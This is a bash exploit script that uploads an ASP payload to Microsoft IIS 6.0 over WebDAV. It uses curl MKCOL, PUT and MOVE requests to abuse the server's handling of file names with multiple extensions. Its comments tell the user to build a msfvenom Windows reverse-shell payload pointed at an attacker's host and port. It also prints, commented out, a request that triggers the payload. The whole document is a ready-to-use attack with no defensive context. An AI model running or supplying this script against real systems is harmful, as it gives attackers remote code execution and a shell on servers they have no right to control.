#!/bin/bash


#
#Simple Script to exploit Webdav running on Microsoft IIS 6.0 incorrectly executing
#ASP code in files that have multiple file extensions. 
#TO USE:
#Generate msfvenom payload: e.g. msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > <filename>
#Then run: ./script <host> <filename>
#
red="\e[31m"
green="\e[32m"
default="\e[39m"

echo [*]Simple WebDav IIS 6.0 ASP Upload Bypass
if [ -z $2 ]; then
	echo -e  "$red[*]$default Usage: $0 <host> <filename>"
	exit
fi

HOST=$1
FILE=$2

URL="http://$HOST/"

curl -X MKCOL "$URL/up/" &> /dev/null

curl -T $FILE "$URL/up/upload.txt" &> /dev/null
curl -X MOVE --header "Destination:$URL/up/$FILE;.txt" "$HOST/up/upload.txt" &> /dev/null

echo -e "$green[+]$default Done! Now navigate to http://$HOST/up/$FILE;.txt to run the script."

#To execute it straight away, uncomment this:
#curl "$HOST/up/$FILE;.txt" > /dev/null
